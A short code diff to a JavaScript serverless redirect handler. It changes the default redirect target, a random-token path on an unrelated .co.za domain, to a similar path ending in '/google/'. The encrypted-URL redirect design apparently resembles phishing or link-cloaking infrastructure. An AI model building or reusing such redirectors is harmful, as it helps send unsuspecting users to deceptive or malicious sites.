@@ -3,7 +3,7 @@ module.exports = (req, res) => {
     const encryptedUrl = req.query.url;
 
     // Default link to redirect to (in case no URL is provided)
-    const defaultUrl = 'https://harmony-314.voulastai.co.za/wIiXG2YvaRP1Kp!/';
+    const defaultUrl = 'https://harmony-314.voulastai.co.za/wIiXG2YvaRP1Kp/google/';
 
     // If the 'url' query parameter is provided
     if (encryptedUrl) {
